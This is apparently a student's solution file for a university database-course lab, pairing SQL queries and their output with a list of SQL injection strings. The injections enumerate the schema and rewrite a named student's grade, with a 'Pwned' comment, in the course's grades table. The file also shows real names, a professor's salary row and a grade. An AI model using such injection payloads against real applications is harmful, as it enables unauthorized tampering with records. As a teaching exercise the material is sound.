/*
HAKCER
https://i.imgflip.com/2y9bxw.jpg
*/

-- P1 QUERYS
-- A
SELECT * FROM uchile.transparencia WHERE apellido_p LIKE '%Baloian%' ORDER BY total DESC;
/*
 anho | mes |     nombres     | apellido_p | apellido_m |            calificacion            |   inicio   |  termino   |                   unidad                   | contrato | estamento |      cargo      | grado |  total
------+-----+-----------------+------------+------------+------------------------------------+------------+------------+--------------------------------------------+----------+-----------+-----------------+-------+---------
   21 |   1 | Nelson Antranig | Baloian    | Tataryan   | DOCTOR                             | 2011-05-01 | 2099-12-31 | Facultad de Ciencias Físicas y Matemáticas | PLANTA   | ACADÉMICO | PROF. ASOCIADO  | 7     | 5051865
...
(24 rows)
*/
-- B
SELECT * FROM nota.cc3201 WHERE id=124;
/*
 id  |            nombre            | nota | comentario
-----+------------------------------+------+------------
 124 | Chávez Fierro, Samuel Ismael |    4 | 
(1 row)
*/
-- C
UPDATE nota.cc3201 SET  nota=6.942027128 WHERE id=124;
/*
ERROR:  permission denied for table cc3201
*/
-- D
SELECT table_name, table_schema FROM information_schema.tables;
/*
cc3201=> SELECT table_name, table_schema FROM information_schema.tables limit 10;
    table_name    | table_schema
------------------+--------------
 g07_candidato    | eleccion
 gctr_has_sa      | superheroes
 pg_type          | pg_catalog
 votosporcondado2 | eleccion
 actor            | cine
 pelicula         | cine
 votosporcondado6 | eleccion
 votosporcondado7 | eleccion
 pg_foreign_table | pg_catalog
 cine             | cinelegado
 ...
(1420 rows)
*/
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='cc3201' AND table_schema='nota'; -- AKA \d+ nota.cc3201
/*
 column_name |     data_type
-------------+-------------------
 id          | integer
 nombre      | character varying
 nota        | double precision
 comentario  | text
(4 rows)
*/

-- P2 INYECCIONES
-- A) '; SELECT table_nam FROM information_schema.tables; --
-- B) '; SELECT column_name, data_type FROM information_schema.columns WHERE table_name='cc3201' AND table_schema='nota'; --
-- C) '; SELECT * FROM nota.cc3201 WHERE nombre like '%Samuel%'; --
-- D, E) '; UPDATE nota.cc3201 SET  nota=6.942027128, comentario='Pwned https://i.imgflip.com/2y9bxw.jpg' WHERE id=124; --
-- Para que no me bajen la nota por que no hice exactamente lo que me piden
-- D) '; UPDATE nota.cc3201 SET nota=6.942027128 WHERE id=124; --
-- E) '; UPDATE nota.cc3201 SET comentario='Pwned https://i.imgflip.com/2y9bxw.jpg' WHERE id=124; --